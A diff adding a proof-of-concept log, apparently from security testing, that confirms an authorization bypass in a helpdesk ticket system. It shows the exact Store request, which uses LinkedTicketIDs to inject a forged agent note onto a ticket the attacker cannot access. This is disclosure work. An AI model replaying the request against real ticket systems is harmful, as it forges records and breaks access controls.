@@ -1,0 +1,15 @@
+==========================================================================
+VULN-001: AgentTicketNoteToLinkedTicket;Store writes to ANY ticket
+Target: http://localhost:25114
+[INFO] perm check is on the SOURCE ticket only (pm:134); the LinkedTicketIDs loop (pm:1209) is unchecked
+==========================================================================
+[SETUP] attacker agent att001_f908d36e — rw on default 'users' queues only
+[SETUP] attacker source ticket TID=66 in 'Raw' (attacker CAN note on it)
+[SETUP] victim ticket TID=67 in off-limits queue vq001_f908d36e (group vgrp001_f908d36e)
+[PROOF] attacker TicketPermission on SOURCE 66: {'ro': 1, 'note': 1, 'rw': 1} (note allowed = legit)
+[PROOF] attacker TicketPermission on VICTIM 67: {'ro': 0, 'note': 0, 'rw': 0} (all 0 = off-limits)
+[STEP] POST Store: source TID=66, LinkedTicketIDs=67 (victim), Body=PWNED-VULN001-f908d36e
+[INFO] Store HTTP 200
+[PROOF] victim ticket articles matching marker: [['82', 'agent', 'forged f908d36e', 'PWNED-VULN001-f908d36e']]
+[OK] exploit confirmed — attacker (no rights on queue vq001_f908d36e) injected an AGENT-sender article 'PWNED-VULN001-f908d36e' onto victim ticket 67 via LinkedTicketIDs — object-level authorization is absent on the note-to-linked-ticket write.
+==> VULN-001: CONFIRMED — attacker (no rights on queue vq001_f908d36e) injected an AGENT-sender article 'PWNED-VULN001-f908d36e' onto victim ticket 67 via LinkedTicketIDs — object-level authorization is absent on the note-to-linked-ticket write.
